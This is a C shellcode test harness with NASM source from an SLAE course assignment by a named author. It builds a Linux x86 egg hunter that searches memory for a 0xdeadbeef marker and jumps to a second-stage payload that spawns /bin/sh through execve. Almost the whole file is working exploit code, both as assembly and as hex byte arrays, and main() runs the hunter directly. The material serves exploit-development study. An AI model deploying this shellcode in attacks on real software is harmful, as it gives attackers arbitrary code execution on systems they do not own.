/*
; Filename: egghunter.nasm
; Author: Paolo Perego <paolo@codiceinsicuro.it>
; Website:  https://codiceinsicuro.it
; Blog post:  https://codiceinsicuro.it/slae/
; Twitter:    @thesp0nge
; SLAE-ID:    1217
; Purpose: This is the first stage of our payload. An egg-hunter shellcode
; looping through memory and jumping on the payload after the
; second egg found in memory.

global _start

section .text

_start:

xor ecx, ecx
mul ecx

next_page:
or dx, 0xfff

next_addr:
; EDX is 4096 here, that is the value of PAGE_SIZE constant
inc edx

; EBX is our memory cursor
lea ebx, [edx+0x4]

xor eax, eax

; access is defined as #define __NR_acces 33 in
; /usr/include/i386-linux-gnu/asm/unistd_32.h:
;
; system call prototype is:
; int access(const char *pathname, int mode);

mov al, 0x21
int 0x80

cmp al, 0xf2 ; 0xf2 is the opcode for EFAULT. If my register
; has this value, a signal for a invalid page
; access it has been received
jz next_page

mov eax, key
mov edi, edx
scasd

jnz next_addr

scasd
jnz next_addr

; At this point we are at the very beginning of our shellcode, after
; the second key. We can jump to it
jmp edi

section .data
key equ 0xdeadbeef


; Filename: execve.nasm
; Author: Paolo Perego <paolo@codiceinsicuro.it>
; Website:  https://codiceinsicuro.it
; Blog post:  https://codiceinsicuro.it/slae/
; Twitter:    @thesp0nge
; SLAE-ID:    1217
; Purpose: This is the default payload for the egg hunter demo. It will
; execute "/bin/sh" using execve() system call.

global _start

dd 0xdeadbeef
dd 0xdeadbeef

section .text

_start:
xor eax, eax ; init EAX to 0
push eax ; pushing 0 to the stack to be used as NULL pointer
; execve is defined as #define __NR_execve 11 in
; /usr/include/i386-linux-gnu/asm/unistd_32.h:
;
; system call prototype is:
        ; int execve(const char *filename, char *const argv[], char *const
envp[]);

push 0x68732f2f ; pushing //bin/sh into the stack
push 0x6e69622f ; the init double / is for alignment purpose

mov ebx, esp ; pointer to *filename
push eax ; pushing in the stack a pointer to NULL
mov edx, esp ; I don't care about environment here
push eax
mov ecx, esp ; I don't even care about passing arguments to
; my /bin/sh

mov al, 0xb ; execve = 11
int 0x80

 */

#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\xb8\xef\xbe\xad\xde\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\xff\xe7";

unsigned char code[] = \
"\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80";


int main(int argc, char **argv)
{
printf("Shellcode Length:  %d\n", strlen(code));
printf("Egghunter Length:  %d\n", strlen(egg_hunter));
int (*ret)() = (int(*)())egg_hunter;
ret();
}



--
$ cd /pub
$ more beer

I pirati della sicurezza applicativa: https://codiceinsicuro.it